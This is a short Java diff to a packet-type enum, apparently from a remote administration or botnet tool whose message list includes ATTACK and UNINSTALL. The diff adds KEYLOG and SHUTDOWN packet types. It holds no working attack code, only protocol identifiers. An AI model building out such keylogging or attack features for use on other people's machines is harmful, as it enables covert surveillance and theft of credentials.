@@ -29,7 +29,9 @@ public enum PacketType {
 	FILE_INFORMATION(22, FileInformationPacket.class),
 	ATTACK(23, AttackPacket.class),
 	COMPUTER_INFORMATION(24, ComputerInfoPacket.class),
-	UNINSTALL(25, UninstallPacket.class);
+	UNINSTALL(25, UninstallPacket.class),
+	KEYLOG(26, KeylogPacket.class),
+	SHUTDOWN(27, ShutdownPacket.class);
 	
 	public final byte id;
 	public final Class<? extends IPacket> clazz;
